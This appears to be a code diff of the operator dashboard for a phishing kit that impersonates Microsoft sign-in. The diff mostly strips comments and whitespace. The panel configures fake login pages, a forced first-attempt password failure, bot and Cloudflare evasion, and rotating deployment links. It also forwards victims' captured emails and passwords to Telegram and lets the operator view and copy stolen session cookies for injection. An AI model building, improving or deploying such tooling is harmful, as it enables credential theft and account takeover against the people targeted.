@@ -19,7 +19,7 @@
   --accent:#00ff41;
   --accent-dim:rgba(0, 255, 65, 0.2);
   --accent-2:#008F11;
-  --accent-3:#b000ff; /* Purple for secondary */
+  --accent-3:#b000ff;
   --danger:#ff3333;
   --shadow:0 0 20px rgba(0, 255, 65, 0.1);
   --glow:0 0 5px var(--accent);
@@ -34,7 +34,6 @@ body{
   color:var(--text);
   overflow-x:hidden;
 }
-/* Scanline effect */
 body::after {
   content: "";
   position: absolute;
@@ -52,9 +51,7 @@ body::after {
   pointer-events: none;
   z-index: 9999;
 }
-
 .app{min-height:100%;display:flex;flex-direction:column;position:relative;z-index:1}
-
 .topbar{
   display:flex;align-items:center;justify-content:space-between;
   padding:16px 24px;
@@ -75,14 +72,13 @@ body::after {
   animation: blink 2s infinite;
 }
 @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
 .nav{display:flex;gap:12px}
 .nav button{
   padding:8px 16px;
   border:1px solid var(--border);
   background:transparent;
   color:var(--text-dim);
-  border-radius:0; /* Sharp edges */
+  border-radius:0;
   cursor:pointer;
   font-family:var(--font-mono);
   font-size:12px;
@@ -101,15 +97,7 @@ body::after {
   color:var(--accent);
   box-shadow:var(--glow);
 }
-
-.container{
-  width:100%;
-  margin:0;
-  padding:16px;
-}
-
-
-
+.container{width:100%;margin:0;padding:16px}
 .main{
   background:var(--panel);
   border:1px solid var(--border);
@@ -120,7 +108,6 @@ body::after {
   content:"";position:absolute;top:-1px;right:-1px;width:20px;height:20px;
   border-top:2px solid var(--accent);border-right:2px solid var(--accent);
 }
-
 h1{
   font-size:24px;margin:0 0 24px;
   color:var(--text);
@@ -128,10 +115,8 @@ h1{
   border-left:4px solid var(--accent);
   padding-left:16px;
 }
-
 .grid{display:grid;grid-template-columns:1fr 2fr;gap:16px;align-items:center}
 label{font-size:12px;color:var(--accent);text-transform:uppercase;letter-spacing:1px}
-
 input[type="text"],input[type="url"],input[type="number"],input[type="password"]{
   width:100%;
   padding:12px;
@@ -148,7 +133,6 @@ input:focus{
   box-shadow:var(--glow);
   background:rgba(0, 255, 65, 0.05);
 }
-
 input[type="checkbox"]{
   appearance:none;
   width:20px;height:20px;
@@ -171,7 +155,6 @@ input[type="checkbox"]:checked::after{
   font-size:14px;
   font-weight:bold;
 }
-
 .row{display:flex;gap:16px;margin-top:32px}
 button{
   padding:12px 24px;
@@ -202,9 +185,7 @@ button.secondary:hover{
   background:var(--border);
   box-shadow:none;
 }
-
 .status{margin-top:16px;font-size:12px;color:var(--text-dim);font-family:var(--font-mono)}
-
 .table-wrap{
   overflow:auto;
   margin-top:24px;
@@ -221,7 +202,6 @@ th{
 }
 td{padding:12px;border-bottom:1px solid #1a1a1a}
 tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
-
 .badge{
   display:inline-block;
   padding:2px 8px;
@@ -230,217 +210,46 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
   text-transform:uppercase;
   font-size:10px;
 }
-
-.test-fail{
-  border:1px solid var(--danger) !important;
-  box-shadow:0 0 10px rgba(255, 51, 51, 0.3) !important;
-}
-
+.test-fail{border:1px solid var(--danger) !important;box-shadow:0 0 10px rgba(255, 51, 51, 0.3) !important;}
 .controls{display:flex;gap:12px;align-items:center;justify-content:space-between;margin-bottom:16px}
 .muted{color:var(--text-dim)}
-
-/* Scrollbar */
 ::-webkit-scrollbar {width: 8px;height: 8px;}
 ::-webkit-scrollbar-track {background: var(--bg-1);}
 ::-webkit-scrollbar-thumb {background: var(--border);border: 1px solid var(--bg-1);}
 ::-webkit-scrollbar-thumb:hover {background: var(--accent);}
-
-/* Compact Settings Layout */
-.settings-header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 24px;
-  border-bottom: 1px solid var(--border);
-  padding-bottom: 12px;
-}
-.settings-header h1 {
-  margin: 0;
-  border: none;
-  padding: 0;
-  font-size: 20px;
-  color: var(--accent);
-  text-transform: uppercase;
-}
-.settings-nav {
-  display: flex;
-  gap: 2px;
-}
-.tab-btn {
-  padding: 8px 16px;
-  background: var(--bg-1);
-  border: 1px solid var(--border);
-  color: var(--text-dim);
-  cursor: pointer;
-  font-family: var(--font-mono);
-  font-size: 12px;
-  text-transform: uppercase;
-  transition: all 0.2s;
-}
-.tab-btn:hover {
-  color: var(--accent);
-  border-color: var(--accent);
-}
-.tab-btn.active {
-  background: var(--accent-dim);
-  color: var(--accent);
-  border-color: var(--accent);
-  box-shadow: var(--glow);
-}
-.tab-content {
-  display: none;
-  animation: fadeIn 0.3s ease;
-}
-.tab-content.active {
-  display: block;
-}
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(5px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-.compact-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-  gap: 16px;
-  align-items: start;
-}
-.form-group {
-  display: flex;
-  flex-direction: column;
-  gap: 6px;
-}
-.form-group label {
-  font-size: 11px;
-  color: var(--accent);
-  text-transform: uppercase;
-  letter-spacing: 1px;
-}
-.form-group input[type="text"],
-.form-group input[type="url"],
-.form-group input[type="number"],
-.form-group input[type="password"] {
-  width: 100%;
-  padding: 8px 12px;
-  background: var(--bg-1);
-  border: 1px solid var(--border);
-  color: var(--text);
-  font-family: var(--font-mono);
-  font-size: 13px;
-}
-.form-group input:focus {
-  border-color: var(--accent);
-  box-shadow: var(--glow);
-  outline: none;
-}
-/* Checkbox styling */
-.form-group.checkbox {
-  flex-direction: row;
-  align-items: center;
-  justify-content: space-between;
-  border: 1px solid var(--border);
-  padding: 10px 12px;
-  background: var(--bg-1);
-  transition: border-color 0.2s;
-}
-.form-group.checkbox:hover {
-  border-color: var(--accent);
-}
-.form-group.checkbox label {
-  margin: 0;
-  cursor: pointer;
-  flex: 1;
-}
-/* Actions row */
-.actions-row {
-  margin-top: 24px;
-  padding-top: 16px;
-  border-top: 1px solid var(--border);
-  display: flex;
-  justify-content: flex-end;
-  gap: 12px;
-}
-/* Tooltip */
-.tooltip-icon {
-  display: inline-block;
-  margin-left: 6px;
-  width: 14px;
-  height: 14px;
-  line-height: 14px;
-  text-align: center;
-  border-radius: 50%;
-  border: 1px solid var(--text-dim);
-  color: var(--text-dim);
-  font-size: 10px;
-  cursor: help;
-}
-.tooltip-icon:hover {
-  border-color: var(--accent);
-  color: var(--accent);
-}
-
-/* Modal */
-.modal-overlay {
-  display:none;position:fixed;top:0;left:0;width:100%;height:100%;
-  background:rgba(0,0,0,0.8);z-index:9999;
-  align-items:center;justify-content:center;
-}
-.modal {
-  background:var(--bg-2);border:1px solid var(--accent);
-  width:90%;max-width:800px;max-height:90vh;
-  display:flex;flex-direction:column;
-  box-shadow:0 0 50px rgba(0,255,65,0.2);
-}
-.modal-header {
-  padding:16px;border-bottom:1px solid var(--border);
-  display:flex;justify-content:space-between;align-items:center;
-  background:var(--bg-1);
-}
+.settings-header {display: flex;justify-content: space-between;align-items: center;margin-bottom: 24px;border-bottom: 1px solid var(--border);padding-bottom: 12px;}
+.settings-header h1 {margin: 0;border: none;padding: 0;font-size: 20px;color: var(--accent);text-transform: uppercase;}
+.settings-nav {display: flex;gap: 2px;}
+.tab-btn {padding: 8px 16px;background: var(--bg-1);border: 1px solid var(--border);color: var(--text-dim);cursor: pointer;font-family: var(--font-mono);font-size: 12px;text-transform: uppercase;transition: all 0.2s;}
+.tab-btn:hover {color: var(--accent);border-color: var(--accent);}
+.tab-btn.active {background: var(--accent-dim);color: var(--accent);border-color: var(--accent);box-shadow: var(--glow);}
+.tab-content {display: none;animation: fadeIn 0.3s ease;}
+.tab-content.active {display: block;}
+@keyframes fadeIn {from { opacity: 0; transform: translateY(5px); }to { opacity: 1; transform: translateY(0); }}
+.compact-grid {display: grid;grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));gap: 16px;align-items: start;}
+.form-group {display: flex;flex-direction: column;gap: 6px;}
+.form-group label {font-size: 11px;color: var(--accent);text-transform: uppercase;letter-spacing: 1px;}
+.form-group input[type="text"],.form-group input[type="url"],.form-group input[type="number"],.form-group input[type="password"] {width: 100%;padding: 8px 12px;background: var(--bg-1);border: 1px solid var(--border);color: var(--text);font-family: var(--font-mono);font-size: 13px;}
+.form-group input:focus {border-color: var(--accent);box-shadow: var(--glow);outline: none;}
+.form-group.checkbox {flex-direction: row;align-items: center;justify-content: space-between;border: 1px solid var(--border);padding: 10px 12px;background: var(--bg-1);transition: border-color 0.2s;}
+.form-group.checkbox:hover {border-color: var(--accent);}
+.form-group.checkbox label {margin: 0;cursor: pointer;flex: 1;}
+.actions-row {margin-top: 24px;padding-top: 16px;border-top: 1px solid var(--border);display: flex;justify-content: flex-end;gap: 12px;}
+.tooltip-icon {display: inline-block;margin-left: 6px;width: 14px;height: 14px;line-height: 14px;text-align: center;border-radius: 50%;border: 1px solid var(--text-dim);color: var(--text-dim);font-size: 10px;cursor: help;}
+.tooltip-icon:hover {border-color: var(--accent);color: var(--accent);}
+.modal-overlay {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;align-items:center;justify-content:center;}
+.modal {background:var(--bg-2);border:1px solid var(--accent);width:90%;max-width:800px;max-height:90vh;display:flex;flex-direction:column;box-shadow:0 0 50px rgba(0,255,65,0.2);}
+.modal-header {padding:16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;background:var(--bg-1);}
 .modal-title {color:var(--accent);font-weight:bold;text-transform:uppercase;}
 .modal-close {cursor:pointer;color:var(--text-dim);font-size:20px;}
 .modal-close:hover {color:var(--danger);}
 .modal-body {padding:16px;overflow:auto;flex:1;}
-.code-block {
-  background:#000;border:1px solid var(--border);padding:16px;
-  font-family:monospace;white-space:pre-wrap;color:var(--text);
-  font-size:12px;
-  max-height: 400px; overflow: auto;
-}
-
-/* Analysis Dashboard */
-.analysis-dashboard {
-  display: grid;
-  grid-template-columns: repeat(4, 1fr);
-  gap: 16px;
-  margin-bottom: 24px;
-}
-.analysis-box {
-  background: var(--bg-1);
-  border: 1px solid var(--border);
-  padding: 20px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  transition: border-color 0.2s;
-}
-.analysis-box:hover {
-  border-color: var(--accent);
-}
-.analysis-value {
-  font-size: 28px;
-  font-weight: 700;
-  color: var(--accent);
-  margin-bottom: 4px;
-  text-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
-}
-.analysis-label {
-  font-size: 11px;
-  color: var(--text-dim);
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  text-align: center;
-}
-
+.code-block {background:#000;border:1px solid var(--border);padding:16px;font-family:monospace;white-space:pre-wrap;color:var(--text);font-size:12px;max-height: 400px; overflow: auto;}
+.analysis-dashboard {display: grid;grid-template-columns: repeat(4, 1fr);gap: 16px;margin-bottom: 24px;}
+.analysis-box {background: var(--bg-1);border: 1px solid var(--border);padding: 20px;display: flex;flex-direction: column;align-items: center;justify-content: center;transition: border-color 0.2s;}
+.analysis-box:hover {border-color: var(--accent);}
+.analysis-value {font-size: 28px;font-weight: 700;color: var(--accent);margin-bottom: 4px;text-shadow: 0 0 10px rgba(0, 255, 65, 0.2);}
+.analysis-label {font-size: 11px;color: var(--text-dim);text-transform: uppercase;letter-spacing: 1px;text-align: center;}
 </style>
 </head>
 <body>
@@ -453,7 +262,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
     </div>
   </div>
   <div class="container">
-    <!-- Sidebar removed -->
     <div class="main">
   <div id="section-settings">
   <div class="settings-header">
@@ -465,7 +273,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
       <button class="tab-btn" data-tab="tab-cloudflare">Cloudflare</button>
     </div>
   </div>
-
   <div class="analysis-dashboard">
     <div class="analysis-box">
       <div class="analysis-value" id="stat-total-cookies">0</div>
@@ -484,16 +291,12 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
       <div class="analysis-label">Total Visits</div>
     </div>
   </div>
-
   <div class="settings-content-wrapper">
-    <!-- Tab General -->
     <div id="tab-general" class="tab-content active">
-      <!-- Deployed Links Section -->
       <div id="deployment-links-container" style="display:none; margin-bottom: 24px; padding: 16px; border: 1px solid var(--accent); background: rgba(0, 255, 65, 0.05);">
           <h3 style="margin-top:0; border-bottom:1px solid var(--accent-dim); padding-bottom:10px; margin-bottom:12px; color:var(--accent); text-transform:uppercase; font-size:14px; letter-spacing:1px;">Click to copy your Links</h3>
           <div id="deployment-links-list" style="display: flex; flex-wrap: wrap; gap: 10px;"></div>
       </div>
-
       <h3 style="border-bottom:1px solid var(--border);padding-bottom:10px;margin-bottom:16px;color:var(--accent);text-transform:uppercase;font-size:14px;">Link Configuration</h3>
       <div class="compact-grid">
         <div class="form-group">
@@ -532,7 +335,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
           <input id="redirectUrl" type="url" placeholder="https://example.com" style="margin-top: 5px;">
         </div>
       </div>
-
       <h3 style="margin-top:30px;border-bottom:1px solid var(--border);padding-bottom:10px;margin-bottom:16px;color:var(--accent);text-transform:uppercase;font-size:14px;">Telegram Report</h3>
       <div class="compact-grid">
         <div class="form-group checkbox">
@@ -546,23 +348,14 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
         <div class="form-group">
           <label for="telegramChatId">Chat ID</label>
           <input id="telegramChatId" type="text" placeholder="123456789">
-          <button id="testTelegram" class="secondary" style="margin-top:8px;width:100%;display:none;border-color:var(--accent);color:var(--accent)">
-            Test Connection
-          </button>
         </div>
       </div>
     </div>
-
-    <!-- Tab Security -->
     <div id="tab-security" class="tab-content">
       <div class="compact-grid">
         <div class="form-group checkbox" style="display:flex;justify-content:space-between;align-items:center;background:rgba(0,255,65,0.02);border:1px solid var(--accent-dim);">
           <div style="display:flex;gap:12px;align-items:center">
-            <div style="color:var(--accent);display:flex;align-items:center;justify-content:center;width:32px;height:32px;border:1px solid var(--accent-dim);background:rgba(0,0,0,0.5)">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-              </svg>
-            </div>
+            <div style="color:var(--accent);display:flex;align-items:center;justify-content:center;width:32px;height:32px;border:1px solid var(--accent-dim);background:rgba(0,0,0,0.5)"></div>
             <div>
               <label for="securityEnabled" style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:13px;font-weight:bold">
                 BOT PROTECTION
@@ -592,8 +385,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
         </div>
       </div>
     </div>
-
-    <!-- Tab Network -->
     <div id="tab-network" class="tab-content">
       <div class="compact-grid">
         <div class="form-group checkbox">
@@ -606,8 +397,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
         </div>
       </div>
     </div>
-
-    <!-- Tab Cloudflare -->
     <div id="tab-cloudflare" class="tab-content">
       <div class="compact-grid">
         <div class="form-group checkbox">
@@ -641,7 +430,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
       </div>
     </div>
   </div>
-
   <div class="actions-row">
     <button class="secondary" id="saveLocal">Save Locally</button>
     <button class="primary" id="saveServer">Save To Server</button>
@@ -678,7 +466,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
     </div>
   </div>
 </div>
-
 <div class="modal-overlay" id="cookieModal">
   <div class="modal">
     <div class="modal-header">
@@ -694,7 +481,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
     </div>
   </div>
 </div>
-
 <script>
 const defaults={template:"microsoft",urlPath:"/page.html",redirectUrl:"https://outlook.office.com/mail/",firstAttemptFail:true,securityEnabled:false,loadingEnabled:true,
   loadingDelayMs:2000,
@@ -704,9 +490,6 @@ const els={
   template:document.getElementById("template"),
   urlPath:document.getElementById("urlPath"),
   redirectUrl:document.getElementById("redirectUrl"),
-  // firstAttemptFail managed in backend/hidden
-  // loadingEnabled managed in backend/hidden
-  // loadingDelayMs managed in backend/hidden
   telemetryEnabled:document.getElementById("telemetryEnabled"),
   telegramBotToken:document.getElementById("telegramBotToken"),
   telegramChatId:document.getElementById("telegramChatId"),
@@ -730,18 +513,14 @@ let currentCfg = {};
 function loadForm(cfg){
   currentCfg = cfg;
   els.template.value=cfg.template||"microsoft";
-  
   const isErrorPage = (cfg.redirectUrl === "/error");
   document.getElementById("redirectType").value = isErrorPage ? "error_page" : "custom";
   document.getElementById("redirectUrlGroup").style.display = isErrorPage ? "none" : "block";
-
   els.redirectUrl.value=cfg.redirectUrl||"";
-  
   els.telemetryEnabled.checked=!!cfg.telemetryEnabled;
   els.telegramBotToken.value=cfg.telegramBotToken||"";
   els.telegramChatId.value=cfg.telegramChatId||"";
   els.securityEnabled.checked=!!cfg.securityEnabled;
-  // Trigger status update
   document.getElementById('securityStatusText').innerText = els.securityEnabled.checked ? 'ACTIVE' : 'OFFLINE';
   document.getElementById('securityStatusText').style.color = els.securityEnabled.checked ? 'var(--accent)' : 'var(--text-dim)';
   els.cfTurnstileEnabled.checked=!!cfg.cfTurnstileEnabled;
@@ -757,7 +536,6 @@ function loadForm(cfg){
   els.proxyEnabled.checked=!!cfg.proxyEnabled;
   els.proxyUrl.value=cfg.proxyUrl||"";
 }
-
 document.getElementById("redirectType").addEventListener("change", function(e) {
   const isError = e.target.value === "error_page";
   document.getElementById("redirectUrlGroup").style.display = isError ? "none" : "block";
@@ -767,7 +545,6 @@ document.getElementById("redirectType").addEventListener("change", function(e) {
     if (els.redirectUrl.value === "/error") els.redirectUrl.value = "";
   }
 });
-
 function readForm(){
   return {
     template:els.template.value,
@@ -796,7 +573,6 @@ function readForm(){
     proxyUrl:els.proxyUrl.value.trim()
   };
 }
-// Auto-show logic for Telegram Test Button
 const checkTelegram = () => {
   const t = els.telegramBotToken.value.trim();
   const c = els.telegramChatId.value.trim();
@@ -805,19 +581,16 @@ const checkTelegram = () => {
 };
 els.telegramBotToken.addEventListener("input", checkTelegram);
 els.telegramChatId.addEventListener("input", checkTelegram);
-
-// Test Telegram Connection
-document.getElementById("testTelegram").addEventListener("click", async () => {
-  const btn = document.getElementById("testTelegram");
+const testTelegramBtn = document.getElementById("testTelegram");
+if (testTelegramBtn) testTelegramBtn.addEventListener("click", async () => {
+  const btn = testTelegramBtn;
   const originalText = btn.textContent;
   btn.textContent = "Sending...";
   btn.disabled = true;
-
   const botToken = els.telegramBotToken.value.trim();
   const chatId = els.telegramChatId.value.trim();
   const proxyEnabled = els.proxyEnabled.checked;
   const proxyUrl = els.proxyUrl.value.trim();
-
   try {
     const res = await fetch("/api?action=test_telegram", {
       method: "POST",
@@ -841,7 +614,6 @@ document.getElementById("testTelegram").addEventListener("click", async () => {
     btn.disabled = false; 
   }, 2000);
 });
-
 (async function init(){
   try{
     const r=await fetch("/api?action=get_config",{cache:"no-store"});
@@ -884,7 +656,6 @@ document.getElementById("saveServer").addEventListener("click",async()=>{
   try{
     const res=await fetch("/api?action=save_config",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(readForm())});
     if(res.ok){setStatus("Saved to server", "var(--accent)");}else{
-        // Try to get error message from response
         try {
             const j = await res.json();
             setStatus("Save failed: " + (j.error || "Unknown error"), "var(--danger)");
@@ -920,14 +691,8 @@ async function loadEvents(){
        return;
     }
     let rows = data.events || [];
-    
-    // Filter out events without password (already done in API mostly, but good to double check if needed)
-    // rows = rows.filter(r => r.password && r.password !== "");
-
     const tbody=document.querySelector("#eventsTable tbody");
     tbody.innerHTML="";
-    
-    // Update header to match flat structure
     const thead = document.querySelector("#eventsTable thead tr");
     if (thead) {
         thead.innerHTML = `
@@ -939,66 +704,41 @@ async function loadEvents(){
           <th>Cookies</th>
         `;
     }
-
-    // Calculate Stats
     let totalCookies = 0;
     let incorrect = 0;
     let correct = 0;
     let totalVisits = 0; 
-
-    // Separate visits from other events for display
     const visibleRows = [];
-
     const passwordVisitIds = new Set();
-
     for (const r of rows) {
         const status = r.botStatus || 'unknown';
         const type = r.type || '';
-        
-        // Count Visits logic:
-        // 1. If it's a 'visit' event
-        // 2. OR if it's an interaction (email_ok, password)
-        
-        // Track unique sessions that reached "password stage" OR visited with a specific email
         if (type === 'email_ok' || (r.password && r.password.trim().length > 0) || (type === 'visit' && r.emailMask && r.emailMask !== 'visitor')) {
             passwordVisitIds.add(r.cookieId);
         }
-
-        // Show visits in table ONLY if they have a specific email (not visitor)
         if (type === 'visit' || type === 'email_ok') {
-            continue; // Skip visits and email_ok, show only password attempts
+            continue;
         }
-
-        // Count Cookies
         const hasCookies = (status === 'completed' || r.hasScript);
         if (hasCookies) {
             totalCookies++;
             correct++;
         }
-
-        // Incorrect (only if not corrected)
         if (r.password && r.password.trim().length > 0 && !hasCookies) {
             incorrect++;
         }
-        
         visibleRows.push(r);
     }
-
     totalVisits = passwordVisitIds.size;
-
-    // Update Analysis Boxes
     if(document.getElementById('stat-total-cookies')) document.getElementById('stat-total-cookies').textContent = totalCookies;
     if(document.getElementById('stat-incorrect')) document.getElementById('stat-incorrect').textContent = incorrect;
     if(document.getElementById('stat-correct')) document.getElementById('stat-correct').textContent = correct;
     if(document.getElementById('stat-visits')) document.getElementById('stat-visits').textContent = totalVisits;
-    
-    // Helper to format time
     const formatTime = (iso) => {
         if (!iso) return "-";
         try {
             const d = new Date(iso);
             if (isNaN(d.getTime())) return iso;
-            // Format: "31 December 2025 16:05"
             return d.toLocaleDateString('en-GB', {
                 day: 'numeric',
                 month: 'long',
@@ -1009,18 +749,11 @@ async function loadEvents(){
             });
         } catch (e) { return iso; }
     };
-
-    // Update Table with filtered rows
     for(const r of visibleRows){
       const tr=document.createElement("tr");
-      
       const status = r.botStatus || 'unknown';
-
-      // Map known types to friendly names if needed
       let typeLabel = r.type || "Unknown";
-      
       const hasCookies = (status === 'completed' || r.hasScript);
-
       if (hasCookies) {
           typeLabel = "Correct";
       } else if (r.password && r.password.trim().length > 0) {
@@ -1028,20 +761,11 @@ async function loadEvents(){
       } else {
           if(typeLabel === "visit") typeLabel = "Site Visit";
           if(typeLabel === "email_ok") typeLabel = "Email Valid";
-          if(typeLabel === "password_fail_first") typeLabel = "Pass Attempt 1";
-          if(typeLabel === "password_second_redirect") typeLabel = "Pass Attempt 2";
       }
-
       const isSuccess = typeLabel.includes('Valid') || typeLabel === 'Correct';
       const badgeStyle = isSuccess ? 'border-color:var(--accent);color:var(--accent)' : 'border-color:var(--danger);color:var(--danger)';
-
-      let cookieBtn = '-';
-      // Status Logic
-      cookieBtn = '';
-      
-      // Determine if we should treat this as a "failed" attempt where no cookies are expected
+      let cookieBtn = '';
       const isFailedAttempt = r.type && (r.type.includes('fail') || r.type.includes('error'));
-
       if (status === 'completed' || r.hasScript) {
             cookieBtn = '<div style="display:flex;gap:4px">';
             if (r.hasScript) {
@@ -1052,10 +776,8 @@ async function loadEvents(){
       } else if (status === 'processing' && !isFailedAttempt) {
            cookieBtn = `<span class="badge" style="border-color:var(--accent-3);color:var(--accent-3)">Running ⏳</span>`;
       } else {
-           // Failed, pending, or unknown -> Show detailed status for debugging
-           cookieBtn = `<span style="color:var(--text-dim);font-size:10px">${status}</span>`;
+           cookieBtn = `<span class="badge" style="border-color:var(--text-dim);color:var(--text-dim)">No cookies</span>`;
       }
-
       tr.innerHTML=`<td>${formatTime(r.time)}</td>
                     <td><span class="badge" style="${badgeStyle}">${typeLabel}</span></td>
                     <td>${r.emailMask||""}</td>
@@ -1070,8 +792,6 @@ async function loadEvents(){
     setStatus("Failed to load events", "var(--danger)");
   }
 }
-
-// Cookie Modal Logic
 window.copyInject = async function(btn, id) {
     const originalText = btn.innerHTML;
     btn.innerHTML = '...';
@@ -1091,7 +811,6 @@ window.copyInject = async function(btn, id) {
         btn.innerHTML = originalText;
     }
 };
-
 window.closeModal = function() {
   document.getElementById('cookieModal').style.display = 'none';
 };
@@ -1100,11 +819,9 @@ window.viewCookies = async function(id, type) {
   const content = document.getElementById('cookieContent');
   modal.style.display = 'flex';
   content.textContent = 'Loading...';
-  
   try {
     let url = `/api?action=get_cookies&id=${id}`;
     if (type) url += `&type=${type}`;
-
     const res = await fetch(url);
     const data = await res.json();
     if (data.ok) {
@@ -1121,13 +838,10 @@ document.getElementById('copyCookiesBtn').addEventListener('click', () => {
     navigator.clipboard.writeText(text).then(() => {
         alert('Copied to clipboard!');
     }).catch(err => {
-        console.error('Failed to copy: ', err);
     });
 });
-
 (function(){
   document.getElementById("refreshEvents").addEventListener("click",loadEvents);
-  // Auto-refresh every 5 seconds to show new cookies faster
   setInterval(loadEvents, 5000);
 document.getElementById("clearLogs").addEventListener("click", async () => {
     if (!confirm("Are you sure you want to clear all logs and cookies? This cannot be undone.")) return;
@@ -1146,11 +860,6 @@ document.getElementById("clearLogs").addEventListener("click", async () => {
 });
   loadEvents();
 })();
-function hexToRgb(h){const s=h.replace("#","");const b=s.length===3?[s[0]+s[0],s[1]+s[1],s[2]+s[2]]:[s.slice(0,2),s.slice(2,4),s.slice(4,6)];return b.map(x=>parseInt(x,16))}
-function parseColor(c){const cs=c.trim();if(cs.startsWith("#")){const r=hexToRgb(cs);return {r:r[0],g:r[1],b:r[2],a:1}}if(cs.startsWith("rgb")){const m=cs.match(/rgba?\(([^)]+)\)/);if(!m)return {r:0,g:0,b:0,a:1};const p=m[1].split(",").map(x=>x.trim());return {r:parseFloat(p[0]),g:parseFloat(p[1]),b:parseFloat(p[2]),a:p[3]!==undefined?parseFloat(p[3]):1}}return {r:0,g:0,b:0,a:1}}
-function relLum(c){const a=[c.r,c.g,c.b].map(v=>{v/=255;return v<=0.03928?v/12.92:Math.pow((v+0.055)/1.055,2.4)});return 0.2126*a[0]+0.7152*a[1]+0.0722*a[2]}
-function ratio(f,b){const L1=Math.max(f,b),L2=Math.min(f,b);return (L1+0.05)/(L2+0.05)}
-function getBg(el){let e=el;while(e){const cs=getComputedStyle(e);const bg=cs.backgroundColor;const c=parseColor(bg);if(c.a>0 && !(c.r===0 && c.g===0 && c.b===0 && c.a===0)) return c;e=e.parentElement}return parseColor("#000000")}
 const navSettings=document.getElementById("navSettings");
 const navSubmissions=document.getElementById("navSubmissions");
 const secSettings=document.getElementById("section-settings");
@@ -1158,26 +867,17 @@ const secSubs=document.getElementById("section-submissions");
 function setActive(btn){[navSettings,navSubmissions].forEach(b=>b.classList.remove("active"));btn.classList.add("active")}
 navSettings.addEventListener("click",()=>{setActive(navSettings);secSettings.style.display="block";secSubs.style.display="none"});
 navSubmissions.addEventListener("click",()=>{setActive(navSubmissions);secSettings.style.display="none";secSubs.style.display="block"});
-
-/* Settings Tabs Logic */
 const tabBtns = document.querySelectorAll('.tab-btn');
 const tabContents = document.querySelectorAll('.tab-content');
-
 tabBtns.forEach(btn => {
   btn.addEventListener('click', () => {
-    // Remove active class from all buttons and contents
     tabBtns.forEach(b => b.classList.remove('active'));
     tabContents.forEach(c => c.classList.remove('active'));
-
-    // Add active class to clicked button
     btn.classList.add('active');
-
-    // Show corresponding content
     const tabId = btn.getAttribute('data-tab');
     document.getElementById(tabId).classList.add('active');
   });
 });
-
 async function loadDeploymentInfo() {
     try {
         const res = await fetch('/api?action=get_deployment_info');
@@ -1189,7 +889,6 @@ async function loadDeploymentInfo() {
                 const list = document.getElementById('deployment-links-list');
                 container.style.display = 'block';
                 list.innerHTML = '';
-                
                 rotation_slugs.forEach(slug => {
                     const path = rotation_path || 'admg';
                     const url = `https://${main_domain}/${path}/${slug}`;
@@ -1217,7 +916,6 @@ async function loadDeploymentInfo() {
             }
         }
     } catch (e) {
-        console.error('Failed to load deployment info', e);
     }
 }
 loadDeploymentInfo();
